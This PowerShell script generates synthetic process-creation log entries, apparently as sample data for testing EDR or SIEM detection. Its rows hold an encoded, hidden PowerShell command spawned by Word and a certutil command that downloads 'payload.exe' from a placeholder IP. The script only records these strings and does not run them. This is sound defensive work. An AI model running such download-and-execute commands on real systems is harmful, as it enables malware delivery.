<#
.SYNOPSIS
    Generates synthetic "suspicious process creation" log entries -
    the kind of thing EDR/SIEM tools flag: encoded PowerShell,
    unusual parent-child process relationships, etc.
#>
$rows = @(
    [pscustomobject]@{
        TimeCreated = Get-Date
        ParentImage = "winword.exe"
        Image       = "powershell.exe"
        CommandLine = "powershell.exe -nop -w hidden -enc SQBFAFgA..."
        Suspicious  = $true
        Reason      = "Office app spawning encoded PowerShell"
    },
    [pscustomobject]@{
        TimeCreated = (Get-Date).AddMinutes(2)
        ParentImage = "explorer.exe"
        Image       = "cmd.exe"
        CommandLine = "cmd.exe /c whoami"
        Suspicious  = $false
        Reason      = "Normal user activity"
    },
    [pscustomobject]@{
        TimeCreated = (Get-Date).AddMinutes(4)
        ParentImage = "powershell.exe"
        Image       = "certutil.exe"
        CommandLine = "certutil.exe -urlcache -split -f http://203.0.113.55/payload.exe"
        Suspicious  = $true
        Reason      = "LOLBin download pattern (certutil abuse)"
    }
)

$rows | Export-Csv -Path "logs\samples\process-events.csv" -NoTypeInformation
Write-Host "Wrote $($rows.Count) simulated process events to logs\samples\process-events.csv"
